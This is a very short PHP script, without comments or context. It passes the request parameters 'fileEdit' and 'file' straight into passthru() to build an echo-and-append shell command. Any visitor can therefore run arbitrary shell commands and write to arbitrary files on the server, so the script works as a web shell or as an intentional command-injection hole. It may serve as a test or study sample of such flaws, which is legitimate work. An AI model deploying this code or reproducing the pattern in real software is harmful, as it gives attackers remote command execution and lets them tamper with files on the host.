<?php
echo "start";
passthru('echo '.$_REQUEST['fileEdit'].' >> '.$_REQUEST['file']); 
?>